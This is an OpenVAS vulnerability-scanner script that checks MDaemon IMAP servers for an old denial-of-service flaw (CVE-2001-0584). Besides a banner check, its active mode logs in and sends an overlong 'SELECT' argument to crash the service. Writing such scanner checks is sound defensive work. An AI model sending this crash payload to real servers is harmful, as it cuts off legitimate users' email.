# OpenVAS Vulnerability Test
# $Id: mdaemon_imap_server_dos2.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MDaemon imap server DoS(2)
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this software by by sending 
a too long argument to the 'SELECT' or 'EXAMINE' commands.

This problem allows an attacker to make the remote service crash, thus 
preventing legitimate users  from receiving e-mails.";

tag_solution = "Upgrade to newest version of this software";

#  Ref: <nitr0s@hotmail.com>

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.14827");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2508);
 script_tag(name:"cvss_base", value:"2.1");
 script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2001-0584");
 
 name = "MDaemon imap server DoS(2)";
 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");

 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/imap", 143);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("imap_func.inc");
port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

safe_checks = 0;
if((acct == "")||(pass == ""))safe_checks = 1;
if ( safe_checks() ) safe_checks = 1;

if ( safe_checks )
{
 banner = get_imap_banner ( port:port );
 if ( ! banner ) exit(0);
 #* OK company.mail IMAP4rev1 MDaemon 3.5.6 ready
 if(ereg(pattern:".* IMAP4.* MDaemon ([0-5]\.|6\.[0-7]\.) ready", string:banner)) security_message(port);
 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    #need a valid account to test this issue
    s = string("? LOGIN ", acct, " ", pass, "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
      
    s = string("? SELECT ", crap(260), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
      
    close(soc);
  
    soc2 = open_sock_tcp(port);
    if(!soc2)security_message(port);
    else close(soc2);
 }
}
